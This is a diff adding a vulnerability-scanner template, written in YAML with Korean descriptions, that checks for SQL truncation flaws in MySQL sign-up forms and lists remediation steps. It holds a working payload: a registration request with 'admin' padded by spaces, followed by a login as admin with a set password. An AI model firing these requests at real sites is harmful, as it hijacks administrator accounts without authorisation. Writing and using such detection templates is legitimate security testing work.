@@ -1,0 +1,60 @@
+id: sqli-truncation-attack
+
+info:
+  name: SQL Truncation Attack
+  author: security-researcher
+  severity: high
+  description: |
+    SQL 트렁케이션(절단) 공격을 탐지합니다.
+    MySQL의 STRICT 모드가 비활성화된 경우, 긴 문자열이 자동으로 잘리는 특성을 이용해
+    'admin   (공백)' 형태로 admin 계정 복제 또는 덮어쓰기가 가능합니다.
+  tags: sqli,truncation,mysql,injection
+  remediation: |
+    - MySQL STRICT_TRANS_TABLES 모드 활성화
+    - 컬럼 길이와 유니크 제약 조건 확인
+    - 사용자명 저장 전 trim() 처리
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/register"
+      - "{{BaseURL}}/signup"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    # admin + 공백으로 패딩하여 컬럼 최대 길이 초과
+    body: "username=admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x&email=attacker@test.com&password=Attack123!"
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 302
+
+  # 생성된 계정으로 로그인 시도
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: "username=admin&password=Attack123!"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+      - type: word
+        part: body
+        words:
+          - "dashboard"
+          - "welcome"
+          - "logout"
+          - "profile"
+        case-insensitive: true
